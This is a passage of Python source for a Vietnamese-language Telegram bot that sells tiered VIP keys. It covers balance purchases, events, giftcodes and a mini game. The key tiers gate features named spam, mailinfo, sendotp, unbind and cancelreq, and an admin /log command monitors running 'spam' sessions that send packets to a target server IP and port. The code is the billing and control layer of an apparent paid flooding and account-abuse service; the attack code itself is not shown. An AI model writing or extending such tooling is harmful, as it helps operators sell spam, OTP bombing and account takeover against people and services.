    item = shop[days_key]
    price = item["price"]
    days = item["days"]
    balance = get_balance(uid)
    if balance < price:
        await q.answer(f"❌ Không đủ tiền! Cần {price:,}đ, bạn có {balance:,}đ", show_alert=True)
        return
    # Trừ tiền TRƯỚC rồi mới làm gì khác
    if not deduct_balance(uid, price):
        await q.answer("❌ Lỗi trừ tiền!", show_alert=True)
        return
    # Tạo key - load DB MỚI sau khi đã trừ tiền xong
    db2 = load_db()
    key = gen_vip_key(days)
    pool = db2.get("key_pool", {})
    pool[key] = {"days": days, "free": False, "used": False,
                 "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    db2["key_pool"] = pool
    save_db(db2)
    ok, detail = activate_vip_key(uid, key)
    new_bal = get_balance(uid)
    await q.message.reply_text(
        f"```\n"
        f"┌───⭓ MUA KEY THÀNH CÔNG\n"
        f"│\n"
        f"│  💎  Gói     :  {item['label']}\n"
        f"│  💰  Đã trả  :  {price:,}đ\n"
        f"│  💳  Số dư   :  {new_bal:,}đ\n"
        f"│  ⏳  Hạn VIP :  {detail}\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    # Báo admin
    try:
        user = q.from_user
        await ctx.bot.send_message(
            ADMIN_ID,
            f"```\n"
            f"┌───⭓ MUA KEY MỚI\n"
            f"│  👤  User   :  {user.first_name} (@{user.username or 'N/A'})\n"
            f"│  🆔  ID     :  {uid}\n"
            f"│  💎  Gói    :  {item['label']}\n"
            f"│  💰  Tiền   :  {price:,}đ\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception:
        pass

# ══════════════════════════════════════════════════════
#               ADMIN: /setshop — Chỉnh bảng giá
# ══════════════════════════════════════════════════════


@admin_only
async def cmd_setshop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Cú pháp: /setshop <id> <days> <price> <label> <desc>
    VD: /setshop 1 7 30000 7-Ngay Gia re nhat"""
    if len(ctx.args) < 5:
        db = load_db()
        shop = db.get("shop", DEFAULT_SHOP)
        text = "```\n┌───⭓ BẢNG GIÁ HIỆN TẠI\n│\n"
        for k, item in shop.items():
            text += f"│  [{k}] {
                item['label']} — {
                item['price']:,                                                  }đ — {
                item['days']}d — {
                item['desc']}\n"
        text += (
            f"├──────────────────\n"
            f"│  Cú pháp chỉnh:\n"
            f"│  /setshop <id> <days> <price> <label> <desc>\n"
            f"│  VD: /setshop 1 7 30000 7-Ngay Gia-re\n"
            f"└──────────────────\n```"
        )
        return await get_reply(update).reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)

    sid = ctx.args[0]
    days = int(ctx.args[1]) if ctx.args[1].isdigit() else 7
    price = int(ctx.args[2]) if ctx.args[2].isdigit() else 10000
    label = ctx.args[3]
    desc = " ".join(ctx.args[4:])
    db = load_db()
    db["shop"][sid] = {
        "days": days,
        "price": price,
        "label": label,
        "desc": desc}
    save_db(db)
    await get_reply(update).reply_text(
        f"```\n✅  Đã cập nhật gói [{sid}]: {label} — {price:,}đ — {days}d\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


@admin_only
async def cmd_delshop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Xóa gói: /delshop <id>"""
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  /delshop <id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    db = load_db()
    sid = ctx.args[0]
    if sid in db.get("shop", {}):
        del db["shop"][sid]
        save_db(db)
        await get_reply(update).reply_text(f"```\n✅  Đã xóa gói [{sid}]\n```", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await get_reply(update).reply_text(f"```\n❌  Không tìm thấy gói [{sid}]\n```", parse_mode=ParseMode.MARKDOWN_V2)


# ══════════════════════════════════════════════════════
#               HỆ THỐNG EVENT
# ══════════════════════════════════════════════════════
# DB event structure:
# db["events"] = {
#   "event_id": {
#     "title": str, "desc": str, "type": "photo"/"link"/"game",
#     "link": str (nếu type=link), "reward_type": "key"/"money",
#     "reward_value": int (ngày hoặc số tiền),
#     "active": bool, "created": str,
#     "submissions": { uid: {"status": "pending"/"approved"/"rejected", "file_id": str} }
#   }
# }

def get_events(db): return db.get("events", {})


async def cmd_event(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Xem danh sách event đang mở"""
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    db = load_db()
    events = get_events(db)
    active = {k: v for k, v in events.items() if v.get("active")}
    if not active:
        return await update.message.reply_text(
            "```\n┌───⭓ SỰ KIỆN\n│  📭  Hiện không có event nào!\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    for eid, ev in active.items():
        reward = f"{
            ev['reward_value']} ngày VIP" if ev["reward_type"] == "key" else f"{
            ev['reward_value']:,}đ"
        sub = ev.get("submissions", {}).get(uid, {})
        status = {
            "pending": "⏳ Chờ duyệt",
            "approved": "✅ Đã duyệt",
            "rejected": "❌ Bị từ chối"}.get(
            sub.get("status"),
            "Chưa tham gia")
        kb = []
        if not sub:
            if ev["type"] == "link":
                link_url = ev.get("link", "").strip()
                row = []
                # Chỉ thêm button url nếu link hợp lệ
                if link_url and link_url.startswith("http"):
                    row.append(
                        InlineKeyboardButton(
                            "🔗  Vào link event",
                            url=link_url))
                if row:
                    kb.append(row)
                kb.append([InlineKeyboardButton(
                    "📸  Gửi ảnh xác nhận", callback_data=f"sub_event_{eid}")])
            elif ev["type"] == "photo":
                kb = [[InlineKeyboardButton(
                    "📸  Gửi ảnh tham gia", callback_data=f"sub_event_{eid}")]]
            elif ev["type"] == "game":
                kb = [[InlineKeyboardButton(
                    "🎮  Chơi ngay", callback_data=f"game_event_{eid}")]]
        elif sub.get("status") == "pending":
            kb = [[InlineKeyboardButton(
                "⏳  Đang chờ duyệt", callback_data="noop")]]
        elif sub.get("status") == "approved":
            kb = [[InlineKeyboardButton(
                "✅  Đã được duyệt", callback_data="noop")]]
        await update.message.reply_text(
            f"```\n"
            f"┌───⭓ SỰ KIỆN: {ev['title']}\n"
            f"│\n"
            f"│  📋  Mô tả    :  {ev['desc']}\n"
            f"│  🎁  Phần thưởng: {reward}\n"
            f"│  📌  Loại     :  {ev['type']}\n"
            f"│  🏷️  Trạng thái: {status}\n"
            f"└──────────────────\n"
            f"```",
            reply_markup=InlineKeyboardMarkup(kb) if kb else None,
            parse_mode=ParseMode.MARKDOWN_V2
        )


async def cmd_joinevent(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """User gửi ảnh tham gia event: /joinevent <event_id>"""
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not ctx.args:
        return await update.message.reply_text("```\n⚠️  /joinevent <event_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    eid = ctx.args[0]
    db = load_db()
    ev = db.get("events", {}).get(eid)
    if not ev or not ev.get("active"):
        return await update.message.reply_text("```\n❌  Event không tồn tại hoặc đã kết thúc!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if uid in ev.get("submissions", {}):
        return await update.message.reply_text("```\n⚠️  Bạn đã tham gia event này rồi!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    # Lưu trạng thái chờ gửi ảnh
    ctx.user_data["pending_event"] = eid
    await update.message.reply_text(
        f"```\n"
        f"┌───⭓ THAM GIA EVENT\n"
        f"│  📋  {ev['title']}\n"
        f"│\n"
        f"│  📸  Hãy gửi ảnh xác nhận ngay bây giờ!\n"
        f"│  ⚠️  Chỉ gửi 1 ảnh duy nhất\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


async def handle_event_photo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Nhận ảnh từ user khi đang pending_event"""
    uid = str(update.effective_user.id)
    eid = ctx.user_data.get("pending_event")
    if not eid or not update.message.photo:
        return
    db = load_db()
    ev = db.get("events", {}).get(eid)
    if not ev or not ev.get("active"):
        ctx.user_data.pop("pending_event", None)
        return
    if uid in ev.get("submissions", {}):
        return await update.message.reply_text("```\n⚠️  Bạn đã nộp rồi!\n```", parse_mode=ParseMode.MARKDOWN_V2)

    file_id = update.message.photo[-1].file_id
    if "submissions" not in ev:
        ev["submissions"] = {}
    ev["submissions"][uid] = {
        "status": "pending",
        "file_id": file_id,
        "username": update.effective_user.username or update.effective_user.first_name}
    db["events"][eid] = ev
    save_db(db)
    ctx.user_data.pop("pending_event", None)

    await update.message.reply_text(
        "```\n┌───⭓ ĐÃ GỬI ẢNH\n│  ✅  Đã nhận ảnh, chờ admin duyệt!\n└──────────────────\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    # Gửi ảnh cho admin duyệt
    try:
        kb_admin = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅  Duyệt", callback_data=f"ev_approve_{eid}_{uid}"),
             InlineKeyboardButton("❌  Từ chối", callback_data=f"ev_reject_{eid}_{uid}")]
        ])
        await ctx.bot.send_photo(
            ADMIN_ID, photo=file_id,
            caption=(
                f"```\n"
                f"┌───⭓ ẢNH THAM GIA EVENT\n"
                f"│  📋  Event : {ev['title']}\n"
                f"│  👤  User  : @{update.effective_user.username or 'N/A'}\n"
                f"│  🆔  ID    : {uid}\n"
                f"└──────────────────\n"
                f"```"
            ),
            reply_markup=kb_admin,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception:
        pass

# ── Admin tạo event ──


@admin_only
async def cmd_createevent(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    /createevent <type> <reward_type> <reward_value> <title> | <desc> [| <link>]
    type: photo / link / game
    reward_type: key / money
    VD: /createevent photo key 7 Event mùa hè | Gửi ảnh để nhận VIP
    VD: /createevent link money 50000 Sự kiện click | Click link và gửi ảnh | https://t.me/abc
    """
    if not ctx.args or len(ctx.args) < 5:
        return await get_reply(update).reply_text(
            "```\n"
            "┌───⭓ TẠO EVENT\n"
            "│  Cú pháp:\n"
            "│  /createevent <type> <reward_type> <reward_value>\n"
            "│              <title> | <desc> [| <link>]\n"
            "│\n"
            "│  type       : photo / link / game\n"
            "│  reward_type: key / money\n"
            "│  VD: /createevent photo key 7 Hè 2025 | Gửi ảnh nhận VIP\n"
            "└──────────────────\n"
            "```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    etype = ctx.args[0].lower()
    rtype = ctx.args[1].lower()
    rval = int(ctx.args[2]) if ctx.args[2].isdigit() else 0
    rest = " ".join(ctx.args[3:])
    parts = [p.strip() for p in rest.split("|")]
    title = parts[0] if len(parts) > 0 else "Event"
    desc = parts[1] if len(parts) > 1 else ""
    link = parts[2] if len(parts) > 2 else ""

    eid = str(int(time.time()))
    db = load_db()
    if "events" not in db:
        db["events"] = {}
    db["events"][eid] = {
        "title": title,
        "desc": desc,
        "type": etype,
        "link": link,
        "reward_type": rtype,
        "reward_value": rval,
        "active": True,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "submissions": {}}
    save_db(db)
    reward = f"{rval} ngày VIP" if rtype == "key" else f"{rval:,}đ"
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ ĐÃ TẠO EVENT\n"
        f"│  🆔  ID      :  {eid}\n"
        f"│  📋  Tên     :  {title}\n"
        f"│  🎁  Thưởng  :  {reward}\n"
        f"│  📌  Loại    :  {etype}\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    # Broadcast event cho tất cả user
    for u in list(db["users"].keys()):
        try:
            await ctx.bot.send_message(
                int(u),
                f"```\n"
                f"┌───⭓ 🎉 SỰ KIỆN MỚI!\n"
                f"│  📋  {title}\n"
                f"│  🎁  Phần thưởng: {reward}\n"
                f"│  📌  Dùng /event để xem chi tiết\n"
                f"└──────────────────\n"
                f"```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            await asyncio.sleep(0.05)
        except Exception:
            pass


@admin_only
async def cmd_endevent(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Kết thúc event: /endevent <event_id>"""
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  /endevent <event_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    eid = ctx.args[0]
    db = load_db()
    if eid not in db.get("events", {}):
        return await get_reply(update).reply_text("```\n❌  Event không tồn tại!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    db["events"][eid]["active"] = False
    save_db(db)
    await get_reply(update).reply_text(f"```\n✅  Đã kết thúc event {eid}\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_listevents(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    events = db.get("events", {})
    if not events:
        return await get_reply(update).reply_text("```\n📭  Chưa có event nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    text = "```\n┌───⭓ DANH SÁCH EVENT\n│\n"
    for eid, ev in events.items():
        subs = len(ev.get("submissions", {}))
        status = "🟢 Đang mở" if ev.get("active") else "🔴 Đã đóng"
        text += f"│  [{eid}] {ev['title']} — {status} — {subs} bài\n"
    text += "└──────────────────\n```"
    await get_reply(update).reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_eventsubs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Xem danh sách nộp bài: /eventsubs <event_id>"""
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  /eventsubs <event_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    eid = ctx.args[0]
    db = load_db()
    ev = db.get("events", {}).get(eid)
    if not ev:
        return await get_reply(update).reply_text("```\n❌  Không tìm thấy event!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    subs = ev.get("submissions", {})
    if not subs:
        return await get_reply(update).reply_text("```\n📭  Chưa có ai nộp bài!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    text = f"```\n┌───⭓ BÀI NỘP: {ev['title']}\n│\n"
    for uid, info in subs.items():
        st = {
            "pending": "⏳",
            "approved": "✅",
            "rejected": "❌"}.get(
            info["status"],
            "?")
        text += f"│  {st}  @{info.get('username', 'N/A')} ({uid})\n"
    text += "└──────────────────\n```"
    await get_reply(update).reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


# ══════════════════════════════════════════════════════
#               GIFTCODE
# ══════════════════════════════════════════════════════
# db["giftcodes"] = { "CODE": {"reward_type": "key"/"money", "reward_value": int,
#                              "max_uses": int, "uses": int, "used_by": [uid,...] } }

async def cmd_giftcode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not ctx.args:
        return await update.message.reply_text(
            "```\n┌───⭓ GIFTCODE\n│  Cú pháp: /giftcode <code>\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    code = ctx.args[0].strip().upper()
    db = load_db()
    gc = db.get("giftcodes", {}).get(code)
    if not gc:
        return await update.message.reply_text("```\n❌  Giftcode không hợp lệ!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if uid in gc.get("used_by", []):
        return await update.message.reply_text("```\n⚠️  Bạn đã dùng code này rồi!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if gc["uses"] >= gc["max_uses"]:
        return await update.message.reply_text("```\n❌  Giftcode đã hết lượt dùng!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    # Trao thưởng
    rtype = gc["reward_type"]
    rval = gc["reward_value"]
    if rtype == "key":
        key = gen_vip_key(rval)
        pool = db.get("key_pool", {})
        pool[key] = {"days": rval, "free": False, "used": False,
                     "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        db["key_pool"] = pool
        save_db(db)
        activate_vip_key(uid, key)
        reward_msg = f"💎  VIP {rval} ngày đã kích hoạt!"
    else:
        add_balance(uid, rval)
        reward_msg = f"💰  +{rval:,}đ vào tài khoản!"
    gc["uses"] += 1
    gc["used_by"].append(uid)
    db["giftcodes"][code] = gc
    save_db(db)
    # Báo admin
    try:
        uname_gc = update.effective_user.username or update.effective_user.first_name
        await ctx.bot.send_message(
            ADMIN_ID,
            f"```\n"
            f"┌───⭓ GIFTCODE ĐƯỢC DÙNG\n"
            f"│  👤  User   :  @{uname_gc}\n"
            f"│  🆔  ID     :  {uid}\n"
            f"│  🔑  Code   :  {code}\n"
            f"│  🎁  Thưởng :  {reward_msg}\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception:
        pass
    await update.message.reply_text(
        f"```\n"
        f"┌───⭓ 🎁 GIFTCODE THÀNH CÔNG\n"
        f"│\n"
        f"│  🔑  Code    :  {code}\n"
        f"│  {reward_msg}\n"
        f"│  🔢  Còn lại :  {gc['max_uses'] - gc['uses']} lượt\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


@admin_only
async def cmd_creategift(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    /creategift <code> <reward_type> <reward_value> <max_uses>
    VD: /creategift SUMMER key 7 100
    VD: /creategift VIP2025 money 50000 50
    """
    if len(ctx.args) < 4:
        return await get_reply(update).reply_text(
            "```\n"
            "┌───⭓ TẠO GIFTCODE\n"
            "│  /creategift <code> <type> <value> <max_uses>\n"
            "│  VD: /creategift SUMMER key 7 100\n"
            "│  VD: /creategift VIP2025 money 50000 50\n"
            "└──────────────────\n"
            "```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    code = ctx.args[0].upper()
    rtype = ctx.args[1].lower()
    rval = int(ctx.args[2]) if ctx.args[2].isdigit() else 0
    max_uses = int(ctx.args[3]) if ctx.args[3].isdigit() else 1
    db = load_db()
    if "giftcodes" not in db:
        db["giftcodes"] = {}
    db["giftcodes"][code] = {
        "reward_type": rtype, "reward_value": rval,
        "max_uses": max_uses, "uses": 0, "used_by": [],
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_db(db)
    reward = f"{rval} ngày VIP" if rtype == "key" else f"{rval:,}đ"
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ ĐÃ TẠO GIFTCODE\n"
        f"│  🔑  Code    :  {code}\n"
        f"│  🎁  Thưởng  :  {reward}\n"
        f"│  🔢  Lượt    :  {max_uses}\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


@admin_only
async def cmd_listgift(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    gcs = db.get("giftcodes", {})
    if not gcs:
        return await get_reply(update).reply_text("```\n📭  Chưa có giftcode nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    text = "```\n┌───⭓ DANH SÁCH GIFTCODE\n│\n"
    for code, info in gcs.items():
        reward = f"{
            info['reward_value']}d VIP" if info["reward_type"] == "key" else f"{
            info['reward_value']:,}đ"
        text += f"│  {code} — {reward} — {info['uses']}/{info['max_uses']} lượt\n"
    text += "└──────────────────\n```"
    await get_reply(update).reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_delgift(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  /delgift <code>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    code = ctx.args[0].upper()
    db = load_db()
    if code in db.get("giftcodes", {}):
        del db["giftcodes"][code]
        save_db(db)
        await get_reply(update).reply_text(f"```\n✅  Đã xóa giftcode {code}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await get_reply(update).reply_text(f"```\n❌  Không tìm thấy {code}\n```", parse_mode=ParseMode.MARKDOWN_V2)


# ══════════════════════════════════════════════════════
#               TRÒ CHƠI MINI TRONG EVENT
# ══════════════════════════════════════════════════════

# Lưu trạng thái game: game_sessions[uid] = {type, answer, eid, attempts}
game_sessions = {}


async def start_game(q, uid: str, eid: str, ctx):
    db = load_db()
    ev = db.get("events", {}).get(eid, {})
    if not ev or not ev.get("active"):
        await q.answer("Event đã kết thúc!", show_alert=True)
        return
    if uid in ev.get("submissions", {}):
        await q.answer("Bạn đã tham gia rồi!", show_alert=True)
        return

    # Random chọn trò chơi
    game_type = random.choice(["guess", "math", "lucky"])

    if game_type == "guess":
        answer = str(random.randint(1, 10))
        desc = "🎲  Đoán số từ 1-10!"
    elif game_type == "math":
        a, b = random.randint(1, 20), random.randint(1, 20)
        answer = str(a + b)
        desc = f"➕  Tính: {a} + {b} = ?"
    else:  # lucky
        answer = "lucky"
        choices = ["🍎", "🍊", "🍋", "🍇", "🍓"]
        picked = random.choice(choices)
        desc = f"🍀  Chọn đúng quả: {picked}"

    game_sessions[uid] = {
        "type": game_type,
        "answer": answer,
        "eid": eid,
        "attempts": 3}

    await q.message.reply_text(
        f"```\n"
        f"┌───⭓ 🎮 TRÒ CHƠI MINI\n"
        f"│\n"
        f"│  {desc}\n"
        f"│  💡  Còn 3 lượt trả lời\n"
        f"│\n"
        f"│  Gõ câu trả lời vào chat!\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


async def handle_game_answer(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Xử lý câu trả lời trò chơi"""
    uid = str(update.effective_user.id)
    sess = game_sessions.get(uid)
    # Nếu không có game session thì bỏ qua (xử lý tiếp ở group_filter)
    if not sess:
        return False

    answer = update.message.text.strip().lower()
    correct = sess["answer"].lower()

    if answer == correct or (
        sess["type"] == "lucky" and answer in [
            "🍎", "🍊", "🍋", "🍇", "🍓"]):
        won = answer == correct
    else:
        won = False

    if won:
        del game_sessions[uid]
        db = load_db()
        ev = db.get("events", {}).get(sess["eid"], {})
        if "submissions" not in ev:
            ev["submissions"] = {}
        ev["submissions"][uid] = {
            "status": "approved",
            "username": update.effective_user.username or update.effective_user.first_name}
        db["events"][sess["eid"]] = ev
        # Trao thưởng
        rtype = ev.get("reward_type", "money")
        rval = ev.get("reward_value", 0)
        if rtype == "key":
            key = gen_vip_key(rval)
            pool = db.get("key_pool", {})
            pool[key] = {"days": rval, "free": False, "used": False,
                         "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            db["key_pool"] = pool
            save_db(db)
            activate_vip_key(uid, key)
            reward_msg = f"💎  VIP {rval} ngày đã kích hoạt!"
        else:
            add_balance(uid, rval)
            reward_msg = f"💰  +{rval:,}đ vào tài khoản!"
        save_db(db)
        await update.message.reply_text(
            f"```\n"
            f"┌───⭓ 🎉 CHÚC MỪNG!\n"
            f"│  ✅  Trả lời đúng!\n"
            f"│  {reward_msg}\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return True
    else:
        sess["attempts"] -= 1
        if sess["attempts"] <= 0:
            del game_sessions[uid]
            await update.message.reply_text(
                f"```\n┌───⭓ HẾT LƯỢT\n│  ❌  Sai rồi! Đáp án: {correct}\n│  Chúc may mắn lần sau!\n└──────────────────\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            game_sessions[uid] = sess
            await update.message.reply_text(
                f"```\n┌───⭓ SAI RỒI\n│  ❌  Sai! Còn {sess['attempts']} lượt\n└──────────────────\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        return True


# ══════════════════════════════════════════════════════
#               GIỚI HẠN CHỨC NĂNG THEO KEY
# ══════════════════════════════════════════════════════
# db["shop"][id]["features"] = ["spam", "mailinfo", "unbind", ...] hoặc []
# = tất cả

def key_has_feature(uid: str, feature: str) -> bool:
    """Kiểm tra key VIP của user có được dùng feature không"""
    db = load_db()
    vk = db["vip_keys"].get(str(uid), {})
    kcode = vk.get("key", "")
    pool = db.get("key_pool", {})
    kinfo = pool.get(kcode, {})
    # Lấy days từ kinfo để map sang shop
    days = str(kinfo.get("days", ""))
    shop = db.get("shop", {})
    item = shop.get(days, {})
    feats = item.get("features", [])
    if not feats:   # Rỗng = không giới hạn
        return True
    return feature in feats


@admin_only
async def cmd_setfeature(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    /setfeature <shop_id> <feature1,feature2,...>
    VD: /setfeature 1 spam,mailinfo
    VD: /setfeature 7 all  (tất cả chức năng)
    """
    if len(ctx.args) < 2:
        return await get_reply(update).reply_text(
            "```\n"
            "┌───⭓ CÀI GIỚI HẠN CHỨC NĂNG\n"
            "│  /setfeature <shop_id> <features>\n"
            "│  Features: spam, mailinfo, sendotp,\n"
            "│            unbind, cancelreq, all\n"
            "│  VD: /setfeature 1 spam,mailinfo\n"
            "│  VD: /setfeature 30 all\n"
            "└──────────────────\n"
            "```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    sid = ctx.args[0]
    features = ctx.args[1].lower()
    db = load_db()
    if sid not in db.get("shop", {}):
        return await get_reply(update).reply_text(f"```\n❌  Không tìm thấy gói [{sid}]!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if features == "all":
        db["shop"][sid]["features"] = []
    else:
        db["shop"][sid]["features"] = [f.strip() for f in features.split(",")]
    save_db(db)
    feat_str = "Tất cả" if not db["shop"][sid]["features"] else ", ".join(
        db["shop"][sid]["features"])
    await get_reply(update).reply_text(
        f"```\n✅  Gói [{sid}] giới hạn: {feat_str}\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


# ══════════════════════════════════════════════════════
#               /log — XEM LOG SPAM
# ══════════════════════════════════════════════════════
@admin_only
async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)

    if ctx.args:
        sid = ctx.args[0].strip()
        logs = spam_logs.get(sid, [])
        info = active_spams.get(sid, {})
        if not info and not logs:
            return await update.message.reply_text(
                "```\n❌  Không tìm thấy phiên spam này!\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        status = "🟢 Đang chạy" if info.get("running") else "🔴 Đã dừng"
        count = info.get("count", 0)
        nick = info.get("nickname", "?")
        server = f"{info.get('server_ip', '?')}:{info.get('server_port', '?')}"
        log_txt = "\n".join(logs[-20:]) if logs else "Chưa có log"
        text = (
            f"```\n"
            f"┌───⭓ LOG PHIÊN: {sid}\n"
            f"│\n"
            f"│  👤  Nick     :  {nick}\n"
            f"│  🌐  Server   :  {server}\n"
            f"│  📊  Trạng thái: {status}\n"
            f"│  📦  Đã gửi   :  {count} gói\n"
            f"│  ⏱️  Interval  :  {SPAM_INTERVAL}s\n"
            f"├──────────────────\n"
            f"│  📋  LOG GẦN NHẤT (20 dòng)\n"
            f"│\n"
        )
        for line in logs[-20:]:
            text += f"│  {line}\n"
        text += "└──────────────────\n```"
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
        return

    # Không có args: hiện tất cả phiên đang chạy
    if not active_spams:
        return await get_reply(update).reply_text(
            "```\n┌───⭓ LOG SPAM\n│  📭  Không có phiên spam nào đang chạy!\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    # Hiện danh sách tất cả phiên
    lines = "```\n┌───⭓ TẤT CẢ PHIÊN SPAM\n│\n"
    for sid2, info2 in active_spams.items():
        status2 = "🟢" if info2.get("running") else "🔴"
        lines += (
            f"│  {status2}  [{sid2}]\n" f"│      👤 {
                info2.get(
                    'nickname',
                    '?')}  |  📦 {
                info2.get(
                    'count',
                    0)} gói\n" f"│      🆔 UID: {
                        info2.get(
                            'uid',
                            '?')}\n" f"├──────────────────\n")
    lines += "│  👉  /log <session_id> để xem chi tiết\n└──────────────────\n```"
    await get_reply(update).reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)
    return

    sid = user_active_session.get(uid)
    if not sid or sid not in active_spams:
        return await get_reply(update).reply_text(
            "```\n┌───⭓ LOG SPAM\n│  📭  Không có phiên nào!\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    info = active_spams[sid]
    logs = spam_logs.get(sid, [])
    status = "🟢 Đang chạy" if info.get("running") else "🔴 Đã dừng"
    count = info.get("count", 0)
    elapsed = int(
        time.time() -
        time.mktime(
            time.strptime(
                info.get(
                    "start_at",
                    "00:00:00"),
                "%H:%M:%S"))) if info.get("start_at") else 0

    text = (
        f"```\n"
        f"┌───⭓ PHIÊN SPAM CỦA BẠN\n"
        f"│\n"
        f"│  🔖  Session  :  {sid}\n"
        f"│  👤  Nick     :  {info.get('nickname', '?')}\n"
        f"│  🌐  Server   :  {info.get('server_ip', '?')}:{info.get('server_port', '?')}\n"
        f"│  📊  Trạng thái: {status}\n"
        f"│  📦  Đã gửi   :  {count} gói\n"
        f"│  ⏱️  Interval  :  {SPAM_INTERVAL}s\n"
        f"│  🕐  Bắt đầu  :  {info.get('start_at', '?')}\n"
        f"├──────────────────\n"
        f"│  📋  LOG GẦN NHẤT\n"
        f"│\n"
    )
    for line in logs[-15:]:
        text += f"│  {line}\n"
    text += "└──────────────────\n```"
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄  Làm mới", callback_data=f"refresh_log_{sid}"),
             InlineKeyboardButton("🛑  Dừng spam", callback_data="stop_spam_btn")]
        ]),
        parse_mode=ParseMode.MARKDOWN_V2
    )


# ══════════════════════════════════════════════════════
#               /add — TẠO BOT VIP MINI
# ══════════════════════════════════════════════════════
@admin_only
async def cmd_add(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Tạo bot mini VIP từ token: /add <bot_token>"""
    if not ctx.args:
        return await get_reply(update).reply_text(
            "```\n"
            "┌───⭓ TẠO BOT VIP MINI\n"
            "│  Cú pháp: /add <bot_token>\n"
            "│  VD: /add 1234567890:AABBcc...\n"
            "│\n"
            "│  Bot mini sẽ có đầy đủ chức năng VIP\n"
            "│  và tự động chạy song song\n"
            "└──────────────────\n"
            "```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    new_token = ctx.args[0].strip()
